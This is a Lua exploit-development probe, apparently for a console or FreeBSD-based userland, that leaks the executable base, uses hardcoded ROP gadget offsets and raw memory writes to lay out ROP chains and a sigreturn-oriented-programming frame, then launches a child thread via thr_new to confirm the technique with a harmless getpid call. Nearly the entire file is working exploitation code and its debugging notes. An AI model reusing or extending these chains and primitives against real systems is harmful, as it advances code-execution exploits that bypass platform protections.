-- CRASH_CLASS: MODERATE
-- PROBE 552b: Child thread SROP mechanism test (isolated)
--
-- 552a crashed because the epilogue ROP chain was at epi_addr but after
-- MapDirectMemory/sigreturn's ret, RSP points to fn_rsp+8 — pops read
-- from RSP, not from where the gadgets are written! The epilogue MUST
-- be laid out inline on the stack starting at fn_rsp.
--
-- This probe tests the SROP mechanism with getpid (harmless) and the
-- fixed inline epilogue. If it works → SROP is proven, 552a's crash
-- was the epilogue bug.
--
-- Child flow:
--   1. sysarch(SET_FSBASE) [ROP via sc_addr]
--   2. marker: 0xAAAA
--   3. sigreturn(uctx) → getpid → epilogue ROP at fn_rsp
--   4. epilogue: store rax (pid) → done flag → thr_exit
--
-- NOTE: uctx is PRE-FILLED by PARENT getcontext. Child doesn't call
-- getcontext — eliminates a variable. Parent's CS/SS/RFLAGS are valid.

print("=== PROBE 552b: CHILD SROP TEST (fixed epilogue) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b, n) for o = 0, n - 4, 4 do wd(b + o, 0) end end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- eboot
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
local function eaddr(off) return eboot + uint64(off) end

-- Gadgets
local G = {
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    mov_m    = 0x92C67,
    bare_ret = 0x42,
}

-- sc_addr from parent getcontext
local MC = 0x40
local gc_ctx = memory.alloc(0x500)
pcall(function() return mk(421)(uint64(gc_ctx)) end)
local rip_val = rq(N(gc_ctx) + MC + 0xA0)
if not rip_val then print("FAIL: getcontext"); return end
local rh, rl = get_hi_lo(rip_val)
if rh < 0 then rh = rh + 0x100000000 end
if rl < 0 then rl = rl + 0x100000000 end
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. fmt(sc_addr))

-- Verify parent SROP
do
    pcall(function() return mk(421)(uint64(gc_ctx)) end)
    wq(N(gc_ctx) + MC + 0xA0, sc_addr)
    wq(N(gc_ctx) + MC + 0x38, uint64(20))
    local ok, rv = pcall(function() return mk(417)(uint64(gc_ctx)) end)
    if not ok or not rv or N(rv) ~= pid then
        print("parent SROP BROKEN"); return
    end
end
print("parent SROP OK")

-- ============================================================
-- Build the ucontext template from parent's getcontext
-- (contains valid CS, SS, RFLAGS, FPU state)
-- ============================================================
local uctx = memory.alloc(0x500)
local uctx_addr = N(uctx)
pcall(function() return mk(421)(uint64(uctx_addr)) end)
print("uctx template captured from parent")

-- ============================================================
-- Child SROP test: getpid
-- ============================================================
print("")
print("[TEST] Child SROP → getpid (inline epilogue)")

local sc455 = mk(455)
local sc_mmap = mk(477)

local shared = memory.alloc(0x100)
z(shared, 0x100)
-- shared+0x00: sigreturn result (rax = pid)
-- shared+0x10: done flag (0xDEAD)
-- shared+0x18: marker: sysarch done (0xAAAA)

-- Child stack (2 MiB)
local cstack_raw = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
if not cstack_raw or N(cstack_raw) == 0 then
    print("mmap child stack failed"); return
end
local cstack = N(cstack_raw)
print("cstack=" .. string.format("0x%X", cstack))

-- Fake TCB
local tcb = memory.alloc(0x1000)
z(tcb, 0x1000)
wq(N(tcb), uint64(N(tcb)))
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(tcb)))

-- ============================================================
-- INLINE epilogue at fn_rsp (THE FIX)
-- After sigreturn → getpid → ret, RSP = fn_rsp + 8.
-- The chain reads from RSP onwards, so layout everything there.
-- ============================================================
local fn_rsp = cstack + 0x3008  -- ≡ 8 mod 16
local sp = fn_rsp
local function spwq(v) wq(sp, v); sp = sp + 8 end

-- [fn_rsp + 0x00]: return address (popped by syscall's ret)
spwq(eaddr(G.pop_rdi))           -- return to pop_rdi_ret

-- After ret: RSP = fn_rsp + 8, RIP = pop_rdi_ret
-- [fn_rsp + 0x08]: data for pop_rdi
spwq(uint64(N(shared)))          -- rdi = &shared (result store)

-- [fn_rsp + 0x10]: next gadget
spwq(eaddr(G.mov_m))             -- [shared] = rax (getpid result)

-- Done flag
spwq(eaddr(G.pop_rax))
spwq(uint64(0xDEAD))
spwq(eaddr(G.pop_rdi))
spwq(uint64(N(shared) + 0x10))
spwq(eaddr(G.mov_m))             -- [shared+0x10] = 0xDEAD

-- thr_exit(431)
spwq(eaddr(G.pop_rax))
spwq(uint64(431))
spwq(eaddr(G.pop_rdi))
spwq(uint64(0))
spwq(sc_addr)

local epi_len = sp - fn_rsp
print("epilogue: " .. epi_len .. " bytes at fn_rsp")

-- ============================================================
-- Patch the ucontext template for getpid
-- ============================================================
-- mc_rip = sc_addr (syscall instruction)
wq(uctx_addr + MC + 0xA0, sc_addr)
-- mc_rsp = fn_rsp
wq(uctx_addr + MC + 0xB8, uint64(fn_rsp))
-- mc_rax = 20 (getpid syscall number)
wq(uctx_addr + MC + 0x38, uint64(20))
-- mc_rflags: ensure IF is set (bit 9), clear TF (bit 8)
-- Leave as captured from parent — should be fine (0x202 = IF set)

print("uctx patched: rip=sc_addr rsp=fn_rsp rax=20")

-- ============================================================
-- Build child ROP chain (minimal: sysarch → marker → sigreturn)
-- ============================================================
local chain_off = 0x100000
local chain_base = cstack + chain_off + 8
local pos = chain_base

local function emit(v) wq(pos, v); pos = pos + 8 end

-- Step 1: sysarch(SET_FSBASE=129, &tcb_ptr)
emit(eaddr(G.pop_rax)); emit(uint64(165))
emit(eaddr(G.pop_rdi)); emit(uint64(129))
emit(eaddr(G.pop_rsi)); emit(uint64(N(tcb_ptr)))
emit(sc_addr)

-- Marker: sysarch done
emit(eaddr(G.pop_rax)); emit(uint64(0xAAAA))
emit(eaddr(G.pop_rdi)); emit(uint64(N(shared) + 0x18))
emit(eaddr(G.mov_m))

-- Step 2: sigreturn(417, &uctx)
-- uctx was pre-filled by parent, already patched
emit(eaddr(G.pop_rax)); emit(uint64(417))
emit(eaddr(G.pop_rdi)); emit(uint64(uctx_addr))
emit(sc_addr)

local chain_len = pos - chain_base
print("chain: " .. chain_len .. " bytes")

-- ============================================================
-- Launch child via thr_new
-- ============================================================
local child_stack_sz = chain_off + 0x10
local param = memory.alloc(0x40)
z(param, 0x40)
wq(N(param) + 0x00, eaddr(G.bare_ret))
wq(N(param) + 0x08, uint64(0))
wq(N(param) + 0x10, uint64(cstack))
wq(N(param) + 0x18, uint64(child_stack_sz))
local tid_p = memory.alloc(8)
wq(N(tid_p), uint64(0))
wq(N(param) + 0x30, uint64(N(tid_p)))

io.flush()
print("launching child...")
io.flush()

local ok_t, ret_t = pcall(function()
    return sc455(uint64(N(param)), uint64(0x38))
end)

if not ok_t or (ret_t and N(ret_t) ~= 0) then
    print(string.format("thr_new FAILED: ok=%s rv=%s", tostring(ok_t),
        ret_t and tostring(N(ret_t)) or "nil"))
    return
end
print("thr_new OK")
io.flush()

-- Wait for done flag
local done = false
for timeout = 1, 1000000 do
    local flag = rq(N(shared) + 0x10)
    if flag and N(flag) == 0xDEAD then
        done = true
        break
    end
    if timeout % 200000 == 0 and not alive() then break end
end

-- Read results
local m_sysarch = rq(N(shared) + 0x18)
local result = rq(N(shared))
local child_tid = rq(N(tid_p))

print("")
print("=== RESULTS ===")
print("alive=" .. tostring(alive()))
print("done=" .. tostring(done))
print("child_tid=" .. fmt(child_tid))
print("sysarch marker=" .. (m_sysarch and fmt(m_sysarch) or "nil") ..
    (m_sysarch and N(m_sysarch) == 0xAAAA and " OK" or " MISSING"))

if done then
    print("sigreturn result (should be pid " .. pid .. "):")
    print("  rax=" .. (result and fmt(result) or "nil"))
    if result and N(result) == pid then
        print("")
        print("*** CHILD SROP GETPID = " .. pid .. " CONFIRMED ***")
    else
        print("  MISMATCH")
    end
else
    print("TIMEOUT — child did not complete")
    -- Dump fn_rsp area for debugging
    print("fn_rsp area dump:")
    for off = 0, 0x60, 8 do
        local v = rq(fn_rsp + off)
        print(string.format("  +0x%02X: %s", off, v and fmt(v) or "nil"))
    end
end

print("")
print("DONE")
